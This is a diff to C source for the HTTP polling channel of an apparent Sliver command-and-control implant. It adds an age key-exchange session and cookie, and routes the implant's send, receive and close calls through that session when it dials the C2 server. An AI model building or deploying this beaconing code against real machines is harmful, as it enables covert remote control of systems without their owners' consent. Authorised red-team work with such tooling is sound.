@@ -1,4 +1,4 @@
-/* src/transport/channel_http.c - POLL channel over HTTP(S)/1.1.
+﻿/* src/transport/channel_http.c - POLL channel over HTTP(S)/1.1.
  *
  * One request carries one signed envelope; the response body carries at most one
  * reply envelope. That is how Sliver's HTTP transport behaves, so a scheduler
@@ -23,6 +23,7 @@
 
 #include "sliver/config.h"
 #include "sliver/frame.h"
+#include "sliver/http_session.h"
 #include "sliver/log.h"
 #include "sliver/platform.h"
 #include "sliver/transport.h"
@@ -44,6 +45,7 @@ typedef struct {
   volatile int closed;
   int requests;
   /* C2 profile (optional): drives the request shape like the Go implant. */
+  sliver_http_session_t sess;
   sliver_http_c2_t prof;
   const sliver_http_path_seg_t *segs;
   size_t seg_count;
@@ -669,6 +671,10 @@ static void http_close(sliver_channel_t *c) {
   h->queued_count = 0;
 }
 
+/* Session-backed callbacks (defined below). */
+static int http_session_send_cb(sliver_channel_t *c, const void *envelope, size_t len);
+static int http_session_recv_cb(sliver_channel_t *c, sliver_buf_t *env_out);
+static void http_session_close_cb(sliver_channel_t *c);
 int sliver_channel_http_dial(const char *c2_url, const char *age_private_key,
                              const char *server_minisign_pubkey, sliver_channel_t **out,
                              char *err, size_t err_len) {
@@ -766,14 +772,48 @@ int sliver_channel_http_dial(const char *c2_url, const char *age_private_key,
   }
   h->rng = (unsigned long long)sliver_now_ms() | 1ULL;
 
+  /* Establish the listener session (age key exchange + cookie). */
+  if (sliver_http_session_init(&h->sess, h->host, h->port, h->use_tls, h->path) != 0) {
+    sliver_channel_free(c);
+    if (err != NULL && err_len != 0) {
+      (void)snprintf(err, err_len, "%s", "http: cannot init session");
+    }
+    return -1;
+  }
+  if (sliver_http_session_establish(&h->sess) != 0) {
+    sliver_channel_free(c);
+    if (err != NULL && err_len != 0) {
+      (void)snprintf(err, err_len, "%s", "http: session establish failed");
+    }
+    return -1;
+  }
+
   c->kind = SLIVER_CHANNEL_POLL;
   c->describe = http_describe;
-  c->send = http_send;
-  c->recv = http_recv;
+  c->send = http_session_send_cb;
+  c->recv = http_session_recv_cb;
   c->poll = http_poll;
-  c->close = http_close;
+  c->close = http_session_close_cb;
   c->state = h;
 
   *out = c;
   return 0;
+}
+/* --- session-backed vtable (H3) ------------------------------------------ */
+static int http_session_send_cb(sliver_channel_t *c, const void *envelope, size_t len) {
+  http_channel_t *h = (http_channel_t *)c->state;
+  return sliver_http_session_send(&h->sess, envelope, len);
+}
+
+static int http_session_recv_cb(sliver_channel_t *c, sliver_buf_t *env_out) {
+  http_channel_t *h = (http_channel_t *)c->state;
+  int rc = sliver_http_session_recv(&h->sess, env_out);
+  /* Scheduler contract: -1 means "no envelope right now, keep looping". */
+  return rc == 1 ? -1 : rc;
+}
+
+static void http_session_close_cb(sliver_channel_t *c) {
+  http_channel_t *h = (http_channel_t *)c->state;
+  sliver_http_session_close(&h->sess);
+  http_close(c);
 }
